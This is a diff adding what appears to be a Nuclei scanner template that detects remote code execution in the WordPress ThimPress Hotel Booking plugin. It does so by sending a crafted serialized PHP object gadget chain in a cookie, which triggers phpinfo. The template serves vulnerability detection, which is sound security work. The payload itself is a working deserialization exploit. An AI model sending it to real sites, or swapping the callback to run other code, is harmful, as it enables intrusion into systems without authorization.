@@ -1,0 +1,43 @@
+id: wordpress-thimpress-hotel-booking-rce
+
+info:
+  name: WordPress ThimPress Hotel Booking RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,wordpress,plugin
+  description: |
+    This template detects a remote code execution vulnerability in the WordPress ThimPress Hotel Booking plugin by sending specific payloads to trigger PHP code execution.
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: thimpress_hotel_booking_1=O:11:"WPHB_Logger":1:{s:21:"\x00WPHB_Logger\x00_handles";C:33:"Requests_Utility_FilteredIterator":67:{x:i:0;a:1:{i:0;s:2:"-1";};m:a:1:{s:11:"\x00*\x00callback";s:6:"";}}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "phpinfo()"
+        negative: true
+
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: thimpress_hotel_booking_1=O:11:"WPHB_Logger":1:{s:21:"\x00WPHB_Logger\x00_handles";C:33:"Requests_Utility_FilteredIterator":67:{x:i:0;a:1:{i:0;s:2:"-1";};m:a:1:{s:11:"\x00*\x00callback";s:7:"phpinfo";}}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "PHP Version"
+          - "PHP API"
+          - "phpinfo()"
